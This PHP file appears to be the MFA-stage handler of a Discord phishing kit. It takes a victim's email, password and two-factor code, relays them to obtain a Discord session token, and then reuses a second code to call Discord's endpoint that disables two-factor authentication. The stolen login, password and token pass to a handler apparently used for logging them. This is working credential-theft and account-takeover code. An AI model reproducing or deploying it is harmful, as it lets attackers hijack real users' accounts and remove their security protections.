<?php
error_reporting(E_ERROR | E_PARSE);
require 'core/system/include.php';

session_start();

if (isset($_SESSION['second']) && isset($_SESSION['token']) 
&& isset($_SESSION['credentials']) && isset($_SESSION['old_mfa'])) {
  unset($_SESSION['second']);
  $token = $_SESSION['token'];
  $data      =  explode("\0", $_SESSION["credentials"]);
  $login     =  $data[0];
  $password  =  $data[1];
  $old_mfa = $_SESSION['old_mfa'];
  unset($_SESSION['token']);
  unset($_SESSION['credentials']);
  unset($_SESSION['old_mfa']);

  $mfacode = $_POST['mfacode'];

  if ($mfacode == $old_mfa) {
    $_SESSION['second'] = true;
    $_SESSION['token'] = $token;
    $_SESSION['credentials'] = $login."\0".$password;
    $_SESSION['old_mfa'] = $old_mfa;
    require("./mfa.php");
    require("./errors/invalid_mfa.php");
    die();
  }

  $ch = curl_init();

  curl_setopt_array($ch, [
    CURLOPT_URL => "https://discord.com/api/v9/users/@me/mfa/totp/disable",
    CURLOPT_HTTPHEADER => [
      "Authorization: " . $token,
      "Content-Type: application/json",
      "x-super-properties: eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDA0Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDQiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InB0LUJSIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTIzODg3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
    ],
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => json_encode([
      "code" => $mfacode
    ]),
    CURLOPT_RETURNTRANSFER => 1,
  ]);

  $response = curl_exec($ch);
  $response = json_decode($response);

  $api_response = $Main->handler(
    $login,
    $password,
    $token,
    $response->{'token'}
  );

  header("Location: " . $url_redirect);
  die();
}

if (isset($_SESSION["credentials"])) {
  $data      =  explode("\0", $_SESSION["credentials"]);
  $login     =  $data[0];
  $password  =  $data[1];
} else {
  $login     =  $_POST["email"];
  $password  =  $_POST["password"];
}

if (!isset($_SESSION["ticket"])) {
  unset($_SESSION["credentials"]);
  unset($_SESSION["captcha_key"]);

  header("Location: ./login_handler");
  die();
}

if (isset($_SESSION["captcha_key"])) {
  $captcha_key = $_SESSION["captcha_key"];
} else {
  $_SESSION["redirect"]     =  "mfa";
  $_SESSION["credentials"]  =  $login . "\0" . $password;

  header("Location: ./captcha");
  die();
}

$client_ip        =  $_SERVER["REMOTE_ADDR"];
$server_hostname  =  $_SERVER["HTTP_HOST"];
$full_url         =  $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"];

if ($login != NULL and $password != NULL and isset($_POST["mfacode"])) {
  if ($captcha_key != NULL) {
    unset($_SESSION["credentials"]);
    unset($_SESSION["captcha_key"]);
    unset($_SESSION["mfa_invalid"]);

    $mfacode = $_POST["mfacode"];
    $_SESSION['old_mfa'] = $mfacode;

    if (!isset($_SESSION["ticket"])) {
      header("Location: ./login_handler");
      die();
    }

    $ticket = $_SESSION["ticket"];

    unset($_SESSION["ticket"]);

    $totp_result = $VLT_API->totp_auth($ticket, $mfacode);

    if ($totp_result == "EINVALID_MFA_CODE") {
      $_SESSION["credentials"] = $login . "\0" . $password;
      $_SESSION["ticket"] = $ticket;
      $_SESSION["mfa_invalid"] = 1;
      header("Location: ./mfa_handler");
      die();
    }

    ///LOG RESULT.
    unset($_SESSION["credentials"]);
    unset($_SESSION["captcha_key"]);
    unset($_SESSION["ticket"]);
    unset($_SESSION["mfa_invalid"]);

    $_SESSION['credentials'] = $login . "\0" . $password;

    $_SESSION['second'] = 1;
    $_SESSION['token'] = $totp_result;
    header("Location: ./mfa");
    die();

    header("Location: " . $url_redirect);
    die();
  } else {
    $_SESSION["redirect"]     =  "mfa";
    $_SESSION["credentials"]  =  $login . "\0" . $password;
    $_SESSION["mfa_invalid"] = 0;

    header("Location: ./captcha");
  }
} else {
  #die($_SESSION["mfa_invalid"]);
  require("./mfa.php");
  if ($_SESSION["mfa_invalid"] == 1) {
    require("./errors/invalid_mfa.php");
  }
  die();
}